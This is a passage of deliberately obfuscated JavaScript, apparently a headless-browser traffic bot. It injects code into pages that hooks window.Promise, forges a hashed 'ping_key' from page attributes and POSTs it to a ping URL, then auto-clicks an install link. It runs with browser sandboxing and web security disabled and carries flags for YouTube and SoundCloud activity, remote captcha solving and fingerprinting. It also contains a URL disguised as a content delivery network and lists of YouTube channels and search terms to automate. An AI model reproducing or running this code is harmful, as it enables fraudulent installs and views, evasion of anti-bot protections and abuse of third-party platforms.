                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x95 * -0x25 + 0xa8d + 0x139 * 0x9 | L >>> -0x1 * 0x2647 + -0x13d0 + 0x3a32) + (M & N | ~M & O) + P + (0x6 * 0x6471cc4 + -0x20249d8f + -0x4 * -0x153f1aa4) + Q[J] << -0xeb * -0x3 + 0xbc6 * -0x1 + 0x905) << -0x33b * -0x7 + -0x2520 + 0xe88 | P >>> -0x207c + 0x18c2 * 0x1 + 0x7d5) + (L & (M = M << -0x497 + -0x25c7 + 0x2a7c * 0x1 | M >>> -0x24bb + 0x11 * -0x1d + 0xca * 0x31) | ~L & N) + O + (-0x250a * -0x4737 + 0x5f704147 * 0x1 + -0xf3b82d4) + Q[J + (0x4 * -0x487 + -0x5 * -0x725 + -0x142 * 0xe)] << 0x79c * -0x3 + 0x7 * -0x5e + 0x1966) << -0x6bf * 0x5 + 0x2547 * 0x1 + -0x3 * 0x12d | O >>> -0x1fd7 + -0x908 * 0x2 + 0x3202 * 0x1) + (P & (L = L << -0x1862 + -0x741 + -0xb * -0x2e3 | L >>> -0x214a + 0x1491 + 0xcbb) | ~P & M) + N + (0x53044 * -0x1d20 + 0x2d78b * 0xed9 + 0x102 * 0xc5e223) + Q[J + (-0x3f * -0x7b + 0x135e + -0x31a1)] << -0x675 + 0x1a85 + 0x8 * -0x282) << -0x4 * 0x931 + 0x5 * 0x355 + -0x17 * -0xe0 | N >>> -0x28 * -0x79 + 0x1f01 + -0x31ce) + (O & (P = P << 0x64 * -0x7 + 0x529 * 0x6 + -0x1c1c | P >>> 0x95 + -0x11de * -0x1 + -0x1271) | ~O & L) + M + (-0x65965334 + -0x3 * 0x37cf7f54 + 0x1fe16f * 0xb47) + Q[J + (-0x1 * 0x5ff + 0x1438 + -0xe36)] << 0x17e * 0x16 + 0x6 * 0x28f + -0x302e) << 0x2 * 0xc07 + -0xb77 + -0x2 * 0x649 | M >>> 0x5c1 + -0x1b05 * -0x1 + -0x20ab) + (N & (O = O << -0x1d6d + 0x5 * -0x6d + -0x7eb * -0x4 | O >>> -0xcc1 + -0x1 * -0x1659 + 0x332 * -0x3) | ~N & P) + L + (-0x8a1c8148 + 0x784274af + -0x362e4319 * -0x2) + Q[J + (0x1c * 0xe7 + -0x1231 * 0x1 + 0xd * -0x8b)] << -0xfa8 + -0x1e5 * -0x7 + 0x265, N = N << -0x15 * 0xfb + 0xcb6 + -0x17 * -0x59 | N >>> -0x2ea * 0x4 + -0x63b + 0x11e5;
              for (; J < -0x3c9 + 0xc7b + -0x88a * 0x1; J += -0x443 * 0x5 + 0xb * 0x22d + -0x17 * 0x1d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1524 + 0xa2a + 0xaff | L >>> -0xe10 + 0x13e + 0x3 * 0x44f) + (M ^ N ^ O) + P + (-0x7913a8 * 0x68 + 0x4c3c3e3d + 0x1e769 * 0x2c04) + Q[J] << 0x1c8f + -0x198f + -0x300) << 0x1c12 + 0x114b + 0xb56 * -0x4 | P >>> 0x20ed * 0x1 + -0xb1f + 0x15b3 * -0x1) + (L ^ (M = M << -0x1 * 0xe95 + -0x68 * -0x11 + 0x7cb | M >>> -0x1 * -0x1d4b + -0x6 * 0x24b + -0x1 * 0xf87) ^ N) + O + (-0x4a7f699c + -0xa8ab72d1 * -0x1 + 0x10ade26c) + Q[J + (-0x80b + 0x749 * -0x3 + -0x1de7 * -0x1)] << 0x22a2 + 0x4ef * -0x4 + -0xee6) << 0x1 * 0x1f6c + 0x14b3 + 0x12 * -0x2e5 | O >>> 0x1a8b + -0x247c + 0xa0c) + (P ^ (L = L << -0x1 * 0x1c94 + 0x120b + 0xaa7 | L >>> 0x74 * -0x34 + 0x778 + 0x101a) ^ M) + N + (0x17 * 0x1b2f155 + -0xbef470ae + -0x674 * -0x28b6a7) + Q[J + (0x14e6 + 0x1a4b * 0x1 + -0x2f2f)] << 0x1 * -0x1009 + 0x3 * -0x3f3 + -0x56 * -0x53) << 0x141f + 0x1691 + -0x2aab | N >>> -0x12cd + 0xfc7 + 0x59 * 0x9) + (O ^ (P = P << 0x24be * -0x1 + 0xc90 + -0x613 * -0x4 | P >>> 0x24ca + 0x40 * 0x6a + -0x3c * 0x10e) ^ L) + M + (0xc2a919c5 + 0x4c489fb1 + 0xa017cdd5 * -0x1) + Q[J + (-0xcf2 + 0x12d * -0x1f + -0x66 * -0x7c)] << -0x1ceb + 0x33a + 0x19b1) << 0x2 * -0x11b9 + -0x117a + 0x34f1 | M >>> 0x1 * 0xc5b + 0x148a + -0x20ca) + (N ^ (O = O << -0x1 * 0x245f + -0x1 * -0x97d + -0x10 * -0x1b0 | O >>> -0xb8e + -0x7 * -0x526 + -0x187a * 0x1) ^ P) + L + (0xaa5f9383 + -0x152b8e72 * 0xa + -0xfb6 * -0x9afab) + Q[J + (0x2 * -0xd57 + 0x9e9 * -0x2 + 0x2e84)] << -0x864 + -0x1b9f + 0x2403, N = N << 0x17f0 + 0x1 * 0x13c1 + 0x73 * -0x61 | N >>> 0x8 * -0x278 + -0xd * 0x2ab + 0x3671 * 0x1;
              for (; J < -0x13 * 0x1e7 + -0x83c + 0x2c9d; J += 0x145e + 0x13 * -0xa5 + -0x81a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x2683 + -0x1917 + -0xd67 * 0x1 | L >>> -0x1d9e + 0x237a + 0x1eb * -0x3) + (M & N | M & O | N & O) + P - (-0x2692ac * -0x27b + -0x3fd3db7f + 0x1b036f55 * 0x3) + Q[J] << 0x3 * 0x7c0 + 0x1d * -0x127 + -0x1 * -0xa2b) << 0x13cd + -0x49 * 0x35 + -0x4ab | P >>> -0x1a11 + 0x2168 + -0x73c) + (L & (M = M << 0x21d9 + 0x13c7 + 0x3 * -0x11d6 | M >>> 0x2430 + -0x926 + -0x1b08) | L & N | M & N) + O - (0x72d0c88c + 0x3a50d * -0x2f79 + 0xab19e0bd) + Q[J + (-0x17 * 0x61 + -0x1 * -0x23ae + -0x1af6)] << 0x1cb5 * -0x1 + -0x6d * -0x1a + 0x11a3) << 0x611 * 0x5 + 0xdf3 + -0x2c43 | O >>> -0x17 * 0x1b1 + 0x357 * -0x4 + 0x345e) + (P & (L = L << -0x10dd + 0x263b * -0x1 + -0xbf * -0x4a | L >>> 0x3c * -0xc + 0x2478 + -0x21a6) | P & M | L & M) + N - (-0xd4826c2c + -0x42d951e9 + -0x8f * -0x2be35b7) + Q[J + (-0x1a15 + 0x211b + -0x704)] << 0x696 * 0x1 + 0x1 * 0x1e73 + 0x1 * -0x2509) << 0x16c3 * 0x1 + -0x5 * -0x503 + 0xfef * -0x3 | N >>> 0x10a1 + 0x9ea + -0x1a70) + (O & (P = P << -0x17 * -0x13 + -0xe15 + 0xd * 0xf6 | P >>> -0x20a4 + -0x2079 + 0x411f * 0x1) | O & L | P & L) + M - (0x30ebda * -0x265 + 0x103f3f03 * 0xb + 0x33514f05) + Q[J + (0x15aa + -0x842 * -0x4 + 0x1 * -0x36af)] << 0x11b * -0x1 + -0x24a1 + -0x3c * -0xa1) << 0x2030 + -0x1ec1 + -0x16a * 0x1 | M >>> 0xaff + -0x1 * -0x91f + -0x1403) + (N & (O = O << 0xce5 * -0x1 + -0xa21 + -0xb92 * -0x2 | O >>> -0x1 * 0x12af + 0x60c * 0x3 + 0x8d) | N & P | O & P) + L - (0xa60e740e * 0x1 + 0x1 * 0x6bc49ac3 + -0x1 * 0xa0eecbad) + Q[J + (0xa59 * 0x1 + -0x1a6e + 0x1019)] << 0xc9 * 0x1d + -0x19d2 + 0x30d, N = N << 0x6f * -0x3b + -0x1462 + 0x2e15 | N >>> -0x1dd3 + -0x5fd + 0x23d2;
              for (; J < 0x1212 * 0x1 + -0x6e9 + -0xad9 * 0x1; J += 0xd9c + -0x1 * 0x1089 + 0x3a * 0xd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2499 + 0x237f + -0x4813 * 0x1 | L >>> -0xa9 + -0x603 * -0x3 + -0x1 * 0x1145) + (M ^ N ^ O) + P - (-0x8e9b25b + -0x5613e03f + 0x949ad0c4) + Q[J] << -0x13 * 0x49 + -0x1f35 + 0x125 * 0x20) << -0xf0b * 0x1 + -0x2709 + 0x3619 | P >>> 0x5 * -0x25b + 0x1c9c + -0x10ba) + (L ^ (M = M << 0x23a1 + -0x1 * 0x83f + -0x1b44 | M >>> -0x134f + 0x1406 + -0xb5) ^ N) + O - (-0x514b783a + 0x375d67dc + 0x4f8b4e88) + Q[J + (-0xcb7 * -0x2 + -0x1916 + -0x57)] << 0xbf * -0xa + -0x244c + 0x2bc2) << -0x2 * 0x1083 + 0x1afa * -0x1 + 0x3c05 | O >>> -0x2 * -0xdf6 + 0x1ee9 * -0x1 + 0x42 * 0xc) + (P ^ (L = L << -0x8 * -0xef + 0x9 * -0x375 + 0x229 * 0xb | L >>> 0x1392 + 0x67 * 0x61 + 0x35 * -0x11b) ^ M) + N - (-0x2c81315 * 0xe + 0x47439e32 + 0x154aab1e) + Q[J + (0x20c9 * 0x1 + -0x58 * -0x22 + 0x2c77 * -0x1)] << 0x1 * -0x2527 + 0x517 * -0x5 + 0x6 * 0xa6f) << 0x242 + 0x206 * 0x2 + -0x649 * 0x1 | N >>> -0x2360 + -0x15e0 + 0x1 * 0x395b) + (O ^ (P = P << 0x16ac + 0x6a2 + 0x1 * -0x1d30 | P >>> 0x24f8 + 0x1 * 0x101f + -0x3515) ^ L) + M - (0x2203 * -0xbae3 + 0x426a70df + 0x21780b * 0x5c) + Q[J + (0x13 * -0x25 + 0xce * 0x2e + 0x5 * -0x6da)] << 0x2ad * -0x5 + 0x1c87 + -0xf26 * 0x1) << 0xe57 + -0x1 * -0x653 + 0x97 * -0x23 | M >>> -0xd * -0x8b + 0x2068 + -0x16 * 0x1ca) + (N ^ (O = O << 0x2 * 0x6b + 0x1a21 + -0x1ad9 | O >>> 0x534 * 0x6 + 0x46 * 0x13 + -0x3a4 * 0xa) ^ P) + L - (0x3e4ca0c6 + -0x54c3c6ab + 0x4c14640f * 0x1) + Q[J + (0x350 * -0x2 + 0x910 * 0x4 + -0x1d9c)] << -0x24f6 * -0x1 + -0x803 + -0x1cf3 * 0x1, N = N << -0x607 * 0x2 + 0x5 * -0xd + 0xc6d | N >>> -0x1 * 0x2330 + 0xd * 0x34 + 0x1 * 0x208e;
              this['h0'] = this['h0'] + L << -0x2 * -0x3f1 + 0x20d1 * -0x1 + 0x1 * 0x18ef, this['h1'] = this['h1'] + M << -0x11 * 0x52 + 0x2 * 0x115a + -0x1d42, this['h2'] = this['h2'] + N << 0xbe * 0x7 + -0x2d7 * -0xb + -0x3 * 0xc25, this['h3'] = this['h3'] + O << 0x644 * 0x4 + -0x1817 + -0xf9, this['h4'] = this['h4'] + P << 0xc2c + -0x15e7 + -0x2f * -0x35;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1ad0 + 0x152a + 0x45a * -0xb & 0x26a3 + -0x20d8 + -0x5bc] + w[J >> -0x27e * -0xd + -0x3a * -0x14 + -0x126b * 0x2 & 0x4 * -0x40 + 0x4cd * -0x5 + -0x1910 * -0x1] + w[J >> 0x1 * -0x1390 + -0x1 * 0x16d9 + 0x2a7d & -0x1 * -0x5ad + 0x1a0 * -0x7 + 0x5c2] + w[J >> 0x18e4 + 0xf02 * -0x1 + -0x9d2 & -0xb2 * 0x35 + -0x2006 + 0x44ef] + w[J >> 0x3 * -0x81d + -0x41d + 0x39 * 0x80 & 0x5ba + 0xc * 0xd4 + -0xf9b] + w[J >> 0xb87 + 0x49e * -0x5 + 0xb97 & -0x7 * 0x26f + -0x176 + 0x128e] + w[J >> 0x20c8 + -0x154d + -0x5 * 0x24b & 0x1628 + -0x1 * -0x26eb + -0x3d04] + w[-0xcaa * 0x2 + -0x1619 + 0x2f7c & J] + w[K >> 0x73 * 0x6 + 0x1c2d + -0x4b * 0x69 & 0xd3a + 0x107e + -0x1da9] + w[K >> -0x2ca * -0x8 + 0x24ca + 0x245 * -0x1a & 0x5 * 0x6f + -0x21 * -0x79 + 0x3 * -0x5e7] + w[K >> -0x24 * -0x49 + 0x546 + -0xf76 & 0x6df * -0x1 + -0x4 * 0x787 + 0xb * 0x35e] + w[K >> 0xca7 + -0x195b + -0x13 * -0xac & 0x17e2 + 0x2 * 0x12a + -0x203 * 0xd] + w[K >> -0x22e4 + -0x1 * 0x1fd3 + 0xd3 * 0x51 & 0x1e33 * -0x1 + -0x151f * -0x1 + 0x923] + w[K >> 0xc * -0x30e + 0x23ad + 0x103 & 0x34 * -0x47 + -0x95 + 0xf10] + w[K >> 0x1200 + -0x16a3 + 0x4a7 & 0x23cb + 0x1f83 + -0x37 * 0x139] + w[0x2536 + -0xba + -0x5 * 0x749 & K] + w[L >> 0x1 * 0x2257 + 0x219d + -0x43d8 & 0x72c * -0x4 + 0xa85 + 0x123a] + w[L >> 0x195 + 0xd8d * -0x1 + 0x304 * 0x4 & -0x7 * -0x30e + -0x2186 + -0x411 * -0x3] + w[L >> -0x10ab + 0x442 + 0x17 * 0x8b & 0x230d + -0x6ec * 0x5 + -0x62] + w[L >> -0x1fe + 0x2132 + -0x1f24 & 0x17cb + -0xd * -0x149 + -0x2871 * 0x1] + w[L >> -0x6 * 0x416 + 0x225e + -0x9ce & 0x145f + -0x654 + -0xdfc * 0x1] + w[L >> 0xff6 + -0x1930 + 0x942 & -0x14b6 + 0x2645 + -0x1180] + w[L >> -0x14ce + -0x1237 * 0x2 + -0x40 * -0xe5 & -0x30c + 0x11d * -0x7 + 0xae6] + w[0x1a95 + 0x61 * -0x5f + -0x5 * -0x1e5 & L] + w[M >> 0x2218 + -0x161 * -0x8 + -0x2d04 & -0x1 * -0x688 + 0xc * -0x92 + 0x5f] + w[M >> 0xca7 + -0x1 * 0x2029 + 0x139a & -0x1 * 0x23f1 + 0x2525 + 0x1 * -0x125] + w[M >> -0x3 * -0x9ff + -0xa44 + -0x13a5 & -0x602 * -0x5 + 0x133f + -0x313a] + w[M >> 0x2690 + -0x1 * -0xb1d + 0x1 * -0x319d & 0x43 * -0x6b + -0x267c + 0x428c] + w[M >> -0x1d + 0x222 + -0x1f9 & 0xd91 + -0x2270 + 0x14ee] + w[M >> 0x67 * -0x3f + -0x3a0 * 0x4 + 0x27e1 & 0x17cf + 0x45 * 0x5b + -0x2d7 * 0x11] + w[M >> -0x7 * 0x497 + -0x168c + 0x36b1 & -0x3d7 * -0xa + -0x2660 + 0x9] + w[0x1453 + 0x1d06 + -0x314a & M] + w[N >> 0x1 * -0xe00 + -0x1593 + 0x23af & -0x10ee + -0x9 * -0x3a8 + 0xfeb * -0x1] + w[N >> 0x1a47 + 0x527 * 0x7 + -0x3e40 & -0x2 * -0x369 + 0x216 + -0x8d9] + w[N >> -0x973 * -0x1 + 0x1 * 0x1ffd + -0x295c & 0x1c * 0xbf + -0x85a + -0xc7b] + w[N >> -0x1f04 + -0x495 * -0x8 + -0xcc * 0x7 & -0x67 * 0x2a + -0x18d2 + 0x29c7] + w[N >> 0x2a * -0xbe + 0x47 * -0x13 + 0x247d * 0x1 & 0x1 * 0x2026 + -0x1de2 + -0x235] + w[N >> 0x22d2 + -0x104b * -0x2 + -0x4360 & 0x1f + -0xd4b * -0x2 + -0x1aa6] + w[N >> 0x103f + -0x1a53 + -0x143 * -0x8 & 0x1 * -0x26a0 + 0x1951 * 0x1 + -0x2 * -0x6af] + w[0x49c + 0x1057 + -0x14e4 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xa * -0xed + 0x1d * 0x31 + -0xeb7 & -0x1515 * 0x1 + 0x1b02 + -0x2 * 0x277,
                J >> -0x13 * -0xd + 0x49 * -0x43 + 0x1234 & -0x2077 * 0x1 + -0x2d * -0x12 + 0x1c * 0x115,
                J >> -0x1098 + -0x215c + 0x31fc & -0x259d + 0x3 * -0x710 + 0x59 * 0xac,
                -0x238c + 0xe39 + -0x2 * -0xb29 & J,
                K >> -0xffb + -0xd2e + 0x1d41 * 0x1 & 0x4 * 0x332 + 0x1 * -0x24ac + 0x18e3,
                K >> 0xb5 * 0x23 + -0x2 * -0x6f3 + -0x11 * 0x245 & -0x1 * -0x1b97 + 0x3f4 * 0x2 + 0x18 * -0x170,
                K >> -0x19b * 0x11 + -0xc1 * 0x29 + 0x3a3c & -0x26e1 + -0x260f + 0x119 * 0x47,
                0x248a + -0x10b7 * 0x2 + -0x21d & K,
                L >> -0x9 * 0xa4 + -0x15b * 0x1c + -0x2bd0 * -0x1 & -0x1d1 + 0xb86 * 0x2 + -0x143c,
                L >> -0xce1 + 0x7d * 0x35 + -0xcf0 & -0x8b * 0x3a + -0x11ef * 0x1 + 0x2 * 0x1936,
                L >> -0x3 * 0xee + -0x3 * -0xc2f + 0x5 * -0x6bf & -0xc7d + 0x2057 + -0x12db,
                -0x362 + 0x20c + -0x255 * -0x1 & L,
                M >> -0x1 * -0x13c3 + 0xb * -0x271 + -0x170 * -0x5 & 0x1de0 + 0x12a9 * 0x2 + -0x4233,
                M >> 0x130b + 0x18d7 + -0x2bd2 & 0x77 * -0x45 + -0x1a85 + 0x3b97,
                M >> -0x2 * -0xb96 + 0x2 * -0x6fa + -0x930 & -0x3 * -0xc8b + 0x205d + 0x44ff * -0x1,
                -0x1b85 * -0x1 + 0xf18 * -0x2 + 0x86 * 0x7 & M,
                N >> -0xbd8 + -0x232b * 0x1 + 0x2f1b & 0x51 * -0xc + 0x16 * 0x65 + -0x3e3,
                N >> 0x939 + 0x2e1 * 0xc + -0xa7 * 0x43 & -0xe * 0x198 + 0x16a5 + -0x2 * -0x55,
                N >> -0x1 * -0x411 + -0x2611 + 0x2208 & -0x1c05 + 0x1d8 + 0x6cb * 0x4,
                -0x1a35 + 0x147b + -0x6b9 * -0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x66 * -0x4f + 0x606 + 0x8 * 0x331), (K = new DataView(J))['setUint32'](0x47 * 0x2f + 0x12a9 + -0xfd9 * 0x2, this['h0']), K['setUint32'](-0x25 * 0xff + -0x1f73 + 0x4452, this['h1']), K['setUint32'](-0x2464 + 0x179 * -0x17 + 0x464b, this['h2']), K['setUint32'](0x1 * 0x244d + 0x25c3 * 0x1 + -0x4a04, this['h3']), K['setUint32'](0x2 * -0x5 + 0x1077 + -0x105d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1a * -0x10b + -0x1a6 + 0x7 * 0x41c];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1802 + 0x1a9 * -0x9 + 0x26f3;
            J[0xa1c + 0x1edf + -0xd * 0x327]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1134 + 0x1248 + -0x237c] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1 * 0xe26 + 0x315 + 0x69 * -0x2a), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x9 * -0x3d3 + 0x8 * 0x3a5 + 0x544;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x341 + 0x2b * 0xc2 + -0x1779), Promise['resolve'](-0x13e3 + -0xfbd + 0x1 * 0x23a1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x21cb + -0xdd7 * -0x1 + -0x2fa2; j < 0x236c * -0x1 + 0xdfc + 0x1571 * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = -0x5 * 0x79f + 0x740 + 0x3e1b + (0x244b + 0x1e31 + -0x36c4) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xb92 + 0x1478 + -0x8e3) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1 * -0x1042 + -0xbc6 + 0x34 * 0x8a);
    let h = e[f];
    return h;
  }, d(b, c);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + U(0x3, 'YGVb')
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0xa6e + 0x8 * -0x49 + 0x1 * 0xcb6; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const V = b;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f[V(0xf, '*ceV')](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1 * -0x1042 + -0xbc6 + 0x34 * 0x8a);
    let h = e[f];
    if (c['vZDVSz'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x3 * 0x8be + 0x165 * -0x2 + -0x1770, r, s, t = 0x1d3 + -0x25de + 0x240b; s = m['charAt'](t++); ~s && (r = q % (-0x2710 + 0x2bb + 0x1 * 0x2459) ? r * (-0x21ba + -0x2 * -0xdfc + 0x602) + s : s, q++ % (0xce2 * -0x3 + -0x1286 * -0x1 + 0x1424)) ? o += String['fromCharCode'](0x21d9 + -0x760 * -0x4 + -0x3e5a & r >> (-(0x1119 * -0x2 + 0x1 * 0x1693 + 0xba1) * q & -0x66 + 0x7c6 + -0x3ad * 0x2)) : -0x1 * 0x8db + -0x374 + 0x89 * 0x17) {
          s = n['indexOf'](s);
        }
        for (let u = 0x209 * 0xc + 0x1feb * 0x1 + -0x3857, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x25 * 0xe9 + -0x1 * -0x138b + 0x48 * -0xbd))['slice'](-(0x12f5 * -0x1 + 0x2589 + 0x1 * -0x1292));
        }
        return decodeURIComponent(p);
      };
      c['aZXkjm'] = i, b = arguments, c['vZDVSz'] = !![];
    }
    const j = e[0xd * -0x2e1 + -0xba * 0xc + 0x1 * 0x2e25],
      k = f + j,
      l = b[k];
    return !l ? (h = c['aZXkjm'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x225b + -0x10f + 0x11ba * 0x2)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1dd4 + -0x2053 + 0x3e31)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + W(0x2) + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' 